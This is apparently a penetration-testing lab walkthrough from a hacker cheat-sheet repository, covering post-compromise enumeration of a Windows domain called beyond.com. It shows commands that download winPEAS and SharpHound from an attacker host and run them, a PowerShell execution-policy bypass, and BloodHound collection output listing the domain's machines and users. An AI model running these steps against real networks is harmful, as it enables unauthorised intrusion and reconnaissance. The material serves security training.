# Situational Awareness

Downloading and executing winPEAS
>``` shell
>PS C:\Windows\System32\WindowsPowerShell\v1.0> cd C:\Users\marcus
>
>PS C:\Users\marcus> iwr -uri http://192.168.119.5:8000/winPEASx64.exe -Outfile winPEAS.exe
>
># ========== Expected Result ==========
>iwr -uri http://192.168.119.5:8000/winPEASx64.exe -Outfile winPEAS.exe
># =====================================
>
>PS C:\Users\marcus> .\winPEAS.exe
>
># ========== Expected Result ==========
>.\winPEAS.exe
>...
># =====================================
>```

Basic System Information
>``` shell
>����������͹ Basic System Information
>� Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#kernel-exploits
>    Hostname: CLIENTWK1
>    Domain Name: beyond.com
>    ProductName: Windows 10 Pro
>    EditionID: Professional
>```

Operating System Information
>``` shell
>PS C:\Users\marcus> systeminfo
>
># ========== Expected Result ==========
>systeminfo
>
>Host Name:                 CLIENTWK1
>OS Name:                   Microsoft Windows 11 Pro
>OS Version:                10.0.22000 N/A Build 22000
># =====================================
>```

AV Information
>``` shell
>����������͹ AV Information
>  [X] Exception: Object reference not set to an instance of an object.
>    No AV was detected!!
>    Not Found
>```

Network Interfaces, Known hosts, and DNS Cache
>``` shell
>����������͹ Network Ifaces and known hosts
>� The masks are only for the IPv4 addresses 
>    Ethernet0[00:50:56:8A:0F:27]: 172.16.6.243 / 255.255.255.0
>        Gateways: 172.16.6.254
>        DNSs: 172.16.6.240
>        Known hosts:
>          169.254.255.255       00-00-00-00-00-00     Invalid
>          172.16.6.240          00-50-56-8A-08-34     Dynamic
>          172.16.6.254          00-50-56-8A-DA-71     Dynamic
>          172.16.6.255          FF-FF-FF-FF-FF-FF     Static
>...
>
>����������͹ DNS cached --limit 70--
>    Entry                                 Name                                  Data
>dcsrv1.beyond.com                     DCSRV1.beyond.com                     172.16.6.240
>    mailsrv1.beyond.com                   mailsrv1.beyond.com                   172.16.6.254
>```

List containing the most important information about identified target machines
>``` shell
>kali@kali:~/beyond$ cat computer.txt   
>
># ========== Expected Result ==========
>172.16.6.240 - DCSRV1.BEYOND.COM
>-> Domain Controller
>
>172.16.6.254 - MAILSRV1.BEYOND.COM
>-> Mail Server
>-> Dual Homed Host (External IP: 192.168.50.242)
>
>172.16.6.243 - CLIENTWK1.BEYOND.COM
>-> User _marcus_ fetches emails on this machine
># =====================================
>```

Copying SharpHound collector to the beyond directory
>``` shell
>kali@kali:~/beyond$ cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 .
>```

Downloading and importing the PowerShell BloodHound collector
>``` shell
>PS C:\Users\marcus> iwr -uri http://192.168.119.5:8000/SharpHound.ps1 -Outfile SharpHound.ps1
>
># ========== Expected Result ==========
>iwr -uri http://192.168.119.5:8000/SharpHound.ps1 -Outfile SharpHound.ps1
># =====================================
>
>PS C:\Users\marcus> powershell -ep bypass
>
># ========== Expected Result ==========
>Windows PowerShell
>Copyright (C) Microsoft Corporation. All rights reserved.
>
>Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
># =====================================
>
>PS C:\Users\marcus> . .\SharpHound.ps1
>
># ========== Expected Result ==========
>. .\SharpHound.ps1
># =====================================
>```

Executing the PowerShell BloodHound collector
>``` shell
>PS C:\Users\marcus> Invoke-BloodHound -CollectionMethod All
>
># ========== Expected Result ==========
>Invoke-BloodHound -CollectionMethod All
>2022-10-10T07:24:34.3593616-07:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
>2022-10-10T07:24:34.5781410-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
>2022-10-10T07:24:34.5937984-07:00|INFORMATION|Initializing SharpHound at 7:24 AM on 10/10/2022
>2022-10-10T07:24:35.0781142-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
>2022-10-10T07:24:35.3281888-07:00|INFORMATION|Beginning LDAP search for beyond.com
>2022-10-10T07:24:35.3906114-07:00|INFORMATION|Producer has finished, closing LDAP channel
>2022-10-10T07:24:35.3906114-07:00|INFORMATION|LDAP channel closed, waiting for consumers
>2022-10-10T07:25:06.1421842-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 92 MB RAM
>2022-10-10T07:25:21.6307386-07:00|INFORMATION|Consumers finished, closing output channel
>Closing writers
>2022-10-10T07:25:21.6932468-07:00|INFORMATION|Output channel closed, waiting for output task to complete
>2022-10-10T07:25:21.8338601-07:00|INFORMATION|Status: 98 objects finished (+98 2.130435)/s -- Using 103 MB RAM
>2022-10-10T07:25:21.8338601-07:00|INFORMATION|Enumeration finished in 00:00:46.5180822
>2022-10-10T07:25:21.9414294-07:00|INFORMATION|Saving cache with stats: 57 ID to type mappings.
> 58 name to SID mappings.
> 1 machine sid mappings.
> 2 sid to domain mappings.
> 0 global catalog mappings.
>2022-10-10T07:25:21.9570748-07:00|INFORMATION|SharpHound Enumeration Completed at 7:25 AM on 10/10/2022! Happy Graphing!
># =====================================
>```

Directory listing to identify the name of the SharpHound Zip archive
>``` shell
>PS C:\Users\marcus> dir 
>
># ========== Expected Result ==========
>dir
>
>    Directory: C:\Users\marcus
>
>Mode                 LastWriteTime         Length Name                                                                 
>----                 -------------         ------ ----                                                                 
>d-r---         9/29/2022   1:49 AM                Contacts                                                             
>d-r---         9/29/2022   1:49 AM                Desktop                                                              
>d-r---         9/29/2022   4:37 AM                Documents                                                            
>d-r---         9/29/2022   4:33 AM                Downloads                                                            
>d-r---         9/29/2022   1:49 AM                Favorites                                                            
>d-r---         9/29/2022   1:49 AM                Links                                                                
>d-r---         9/29/2022   1:49 AM                Music                                                                
>d-r---         9/29/2022   1:50 AM                OneDrive                                                             
>d-r---         9/29/2022   1:50 AM                Pictures                                                             
>d-r---         9/29/2022   1:49 AM                Saved Games                                                          
>d-r---         9/29/2022   1:50 AM                Searches                                                             
>d-r---         9/29/2022   4:30 AM                Videos                                                               
>-a----        10/10/2022   7:25 AM          11995 20221010072521_BloodHound.zip                                     
>-a----        10/10/2022   7:23 AM        1318097 SharpHound.ps1                                                       
>-a----        10/10/2022   5:02 AM        1936384 winPEAS.exe                                                          
>-a----        10/10/2022   7:25 AM           8703 Zjc5OGNlNTktMzQ0Ni00YThkLWEzZjEtNWNhZGJlNzdmODZl.bin 
># =====================================
>```

Upload Zip Archive to BloodHound
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Situational-Awareness-1.png)

Custom query to display all computers
>``` shell
>MATCH (m:Computer) RETURN m
>```

Show all Computer objects in the BEYOND.COM domain
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Situational-Awareness-2.png)

Identified computer objects and their operating system
>``` shell
>DCSRV1.BEYOND.COM - Windows Server 2022 Standard
>INTERNALSRV1.BEYOND.COM - Windows Server 2022 Standard
>MAILSRV1.BEYOND.COM - Windows Server 2022 Standard
>CLIENTWK1.BEYOND.COM - Windows 11 Pro
>```

Looking up the IP address of INTERNALSRV1 via nslookup
>``` shell
>PS C:\Users\marcus> nslookup INTERNALSRV1.BEYOND.COM
>
># ========== Expected Result ==========
>nslookup INTERNALSRV1.BEYOND.COM
>Server:  UnKnown
>Address:  172.16.6.240
>
>Name:    INTERNALSRV1.BEYOND.COM
>Address:  172.16.6.241
># =====================================
>```

Documenting results and information in computer.txt
>``` shell
>172.16.6.240 - DCSRV1.BEYOND.COM
>-> Domain Controller
>
>172.16.6.241 - INTERNALSRV1.BEYOND.COM
>
>172.16.6.254 - MAILSRV1.BEYOND.COM
>-> Mail Server
>-> Dual Homed Host (External IP: 192.168.50.242)
>
>172.16.6.243 - CLIENTWK1.BEYOND.COM
>-> User _marcus_ fetches emails on this machine
>```

Show all User objects in the BEYOND.COM domain
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Situational-Awareness-3.png)

Discovered domain users
>``` shell
>BECCY
>JOHN
>DANIELA
>MARCUS
>```

Show all User objects in the BEYOND.COM domain
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Situational-Awareness-4.png)
